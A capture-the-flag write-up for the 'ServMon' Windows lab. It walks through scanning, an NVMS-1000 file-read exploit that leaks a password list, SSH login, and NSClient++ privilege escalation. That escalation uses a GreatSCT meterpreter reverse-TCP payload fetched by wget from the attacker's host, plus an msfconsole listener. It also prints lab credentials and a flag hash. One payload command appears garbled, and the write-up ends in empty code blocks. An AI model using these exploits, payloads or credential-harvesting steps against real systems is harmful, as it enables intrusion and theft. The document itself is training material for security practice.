# CTF Writeup: Servmon

## Lab Description

ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user&amp;amp;#039;s desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it&amp;amp;#039;s possible enumerate the system and find the password for `NSClient++` (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts that can be executed in the context of `NT AUTHORITY\SYSTEM`. Users have been given permissions to restart the `NSCP` service, and after creating a malicious script, the service is restarted and command execution is achieved as SYSTEM. 

---


## Reconaissance

An initial nmap scan reveals the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 10.129.227.77
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 15:08 EDT
Nmap scan report for 10.129.227.77
Host is up (0.048s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=10/29%Time=6902664C%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCo
SF:ntent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\x
SF:ef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0
SF:\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tr
SF:ansitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xht
SF:ml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<
SF:script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x2
SF:0</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOptio
SF:ns,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent
SF:-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xb
SF:b\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20T
SF:ransitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transit
SF:ional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">
SF:\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<scrip
SF:t\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20windo
SF:w\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</sc
SF:ript>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,1B
SF:4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Leng
SF:th:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf
SF:<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transi
SF:tional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional
SF:\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<
SF:head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20
SF:type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.lo
SF:cation\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>
SF:\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(X11Probe,6B,"HTTP/1
SF:\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/html\r\nConte
SF:nt-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=10/29%Time=69026652%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocatio
SF:n:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0n\0t\0\0\0\0\0o\0g\0\0\0\
SF:0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x18\(
SF:\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\
SF:r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20
SF:404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRe
SF:quest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20
SF:not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x20
SF:18\r\n\r\nDocument\x20not\x20found");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/29%OT=21%CT=1%CU=31853%PV=Y%DS=2%DC=T%G=Y%TM=690266
OS:D2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS
OS:=U)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=105%GCD=1%IS
OS:R=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%S
OS:S=S%TS=U)SEQ(SP=107%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M552NW
OS:8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN
OS:(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFF
OS:F%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(
OS:R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N
OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-29T19:11:02
|_  start_date: N/A

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   46.39 ms 10.10.14.1
2   46.53 ms 10.129.227.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.38 seconds
```

ftp was accessible anonymously and we were able to navigate into User Directory of Nadine & Nathan.

We retrieved 2 files and an information about:

```
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

Exploring the webpage we find out that it's running "NVMS-1000" Service, a quick google search leads us to an public exploit which is LFI.

Downloaded this PoC:

```
git clone https://github.com/AleDiBen/NVMS1000-Exploit.git
```

Since we know that the passwords.txt file is in the user's directory of nathan. Let's use the exploit and find out credentials.


```
python3 nvms.py 10.129.227.77 Users/Nathan/Desktop/Passwords.txt Passwords.txt
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
++++++++++  END  ++++++++++
```

Gained an wordlist of passwords. Let's try those for ssh.

Tried to bruteforce using this wordlist, but it seems to not work for ftp or ssh.

```
hydra -l nathan -P passwordlist.txt ssh://10.129.227.77
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-29 15:57:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://10.129.227.77:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-29 15:57:30
```

Tried it with nadine:L1k3B1gBut7s@W0rk and logged into the target system as user "nadine".

```
ssh nadine@10.129.227.77
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

Retrieved user.txt in C:\Users\Nadine\Desktop\user.txt

```
67d26cf0d630d8c44aa09d6d46ee6fc0
```

There is an usual service in the C:\Program Data\ Directory called "NSClient++". Further observing this, provides us with an password, which we were able to retrieve from C:\Program Data\NSClient++\nsclient.ini


```
ew2x6SsGTxjRwXOT
```

Enumerated version of nsclient++

```
nadine@SERVMON C:\Program Files\NSClient++>.\nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

Performing Vulnerability Assessment on this version, we find an PoC

```
https://www.exploit-db.com/exploits/46802
```

Since we have an administrator password, which we retrieved from the nsclient.ini file, we can abuse this PoC.

Enumerated running local services --> nscp.exe is running on port 8443

```
PS C:\Users\Nadine> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2316 
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2420
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5696
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       852
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4 
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2376
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       2376
  TCP    0.0.0.0:6063           0.0.0.0:0              LISTENING       5696 
  TCP    0.0.0.0:6699           0.0.0.0:0              LISTENING       5696
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       2376
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       460 
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1100
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1436 
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2276
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       600
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2136
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       616
```

Let's enumerate this service. We will have to abuse portforwarding for this.

```
ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
```

Analyzed the service on

```
https://localhost:8443/index.html
```

Logged in with password ew2x6SsGTxjRwXOT
Navigated to Settings > External Scripts > Scripts > Add new.
Prompted in Section /settings/external scripts/scripts/shell
Key: command
Value: C:\Temp\pwn.bat

Those should be all the steps, now we can upload our malicious file "pwn.bat".

In order for the exploit to work, we will have to restart the nscp service, so our newly created script entry get's loaded into the service.

I press on Control on the top right and reloaded the service.

Since we did all preparations let's prepare our script.
Download the following tool to create a meterpreter payload.

```
git clone https://github.com/GreatSCT/GreatSCT.git
run the setup
```

Generate payload.

```
sudo ./GreatSCT.py --ip 10.10.14.239 --port 1337 -t bypass -p regsvcs/meterpreter/rev_tcp.py -o serv
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 [*] Language: regsvcs
 [*] Payload Module: regsvcs/meterpreter/rev_tcp
 [*] DLL written to: /usr/share/greatsct-output/compiled/serv3.dll
 [*] Source code written to: /usr/share/greatsct-output/source/serv3.cs
 [*] Execute with: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe serv3.dll
 [*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/serv3.rc
```

Started up python server on local machine.

```
python3 -m http.server 80
```

Downloaded the .dll file onto the Server.

```
wget http://10.10.14.239/serv3.dll -o C:\Temp\serv.dll
```


Echo'd our payload on the box to create pwn.bat

```
cmd /c "echo C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe >> C:\Temp\serv.dll > C:\Temp\pwn.bat" 
```


Started up msfconsole listener.


```
msfconsole -r /usr/share/greatsct-output/handlers/serv3.rc
```

Navigated onto "Console" on the webpage and ran it.


```

```





```

```




```

```
